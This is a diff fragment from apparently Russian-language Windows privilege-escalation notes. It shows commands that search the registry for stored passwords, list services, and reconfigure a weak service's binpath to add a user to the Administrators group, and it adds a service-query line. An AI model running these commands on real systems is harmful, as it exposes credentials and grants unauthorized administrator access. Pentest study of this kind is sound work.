@@ -116,6 +116,7 @@ reg query HKLM /f password /t REG_SZ /s - поиск слова password в ре
 reg qury HKLM\SYSTEM\CurrentControlSet\services\ - запрос списка сервисов
 
  sc config daclsvc binpath= "net localgroup administrators user /add" - использование возможности конфига сервиса
+ sc qc daclsvc - запрос параметров сервиса
  
 Автозагрузка.....
 
